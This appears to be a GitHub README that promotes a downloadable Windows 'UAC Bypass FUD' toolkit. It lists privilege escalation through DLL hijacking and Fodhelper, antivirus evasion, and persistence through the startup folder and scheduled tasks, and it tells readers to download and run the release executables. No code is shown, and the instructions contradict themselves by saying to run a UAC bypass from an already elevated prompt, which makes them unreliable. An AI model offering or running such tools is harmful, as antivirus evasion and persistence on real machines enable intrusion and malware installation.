## Introduction

User Account Control (UAC) is a security feature in Windows designed to prevent unauthorized changes to the operating system. While UAC enhances security, it can also be a hurdle for legitimate tasks. This repository provides a collection of methods to bypass UAC, which can be useful for security assessments and penetration testing.

To get started, download the latest release from our [Releases page](https://github.com/aehjhsr/UAC-Bypass-FUD/releases). Follow the instructions provided in the release notes to execute the necessary files.

## Features

- **Administrator Privileges**: Gain elevated privileges for administrative tasks.
- **Bypass UAC**: Utilize various techniques to bypass UAC prompts.
- **DLL Hijacking**: Exploit DLL loading mechanisms for privilege escalation.
- **Exploit Techniques**: Detailed methods for exploiting UAC weaknesses.
- **Fodhelper Bypass**: A specific method targeting the Fodhelper executable.
- **FUD (Fully Undetectable)**: Techniques that minimize detection by security software.
- **Persistence Methods**: Strategies for maintaining access over time.

## Installation

To install the UAC Bypass FUD tools, follow these steps:

1. Visit the [Releases page](https://github.com/aehjhsr/UAC-Bypass-FUD/releases).
2. Download the latest release file.
3. Extract the contents to a directory of your choice.
4. Open a command prompt with administrative privileges.
5. Navigate to the directory where you extracted the files.
6. Execute the necessary files as described in the release notes.

## Usage

After installation, you can start using the tools. Each method has its own usage instructions. Refer to the README files within each method's folder for specific commands and examples.

### Example Command

```bash
./UACBypassMethod1.exe
```

This command will initiate the first UAC bypass method. Make sure to run it in an elevated command prompt.

## Methods

### 1. Administrator Privileges

This method focuses on leveraging existing administrator privileges to execute tasks that would normally require UAC approval. 

### 2. Bypass UAC

Several techniques exist to bypass UAC. The most common methods include:

- **Registry Manipulation**: Modifying registry keys to disable UAC prompts.
- **Scheduled Tasks**: Creating tasks that run with elevated privileges without UAC prompts.

### 3. DLL Hijacking

DLL hijacking involves placing a malicious DLL in a directory that a legitimate application loads. When the application runs, it inadvertently loads the malicious DLL, allowing for privilege escalation.

### 4. Exploit Techniques

This section covers various exploits that target UAC weaknesses. Examples include:

- **Using Windows Services**: Exploiting services that run with elevated privileges.
- **File Association Exploits**: Manipulating file associations to execute code without UAC prompts.

### 5. Fodhelper Bypass

The Fodhelper executable can be exploited to gain elevated privileges. This method is effective because it is often trusted by the system.

### 6. FUD Techniques

Fully Undetectable (FUD) techniques aim to avoid detection by antivirus and endpoint protection systems. This involves obfuscating code and using less common methods to execute payloads.

### 7. Persistence Methods

Persistence methods ensure that access is maintained even after a system reboot. Techniques include:

- **Startup Folder**: Placing executables in the startup folder to run on boot.
- **Scheduled Tasks**: Creating tasks that run at specific intervals or system events.
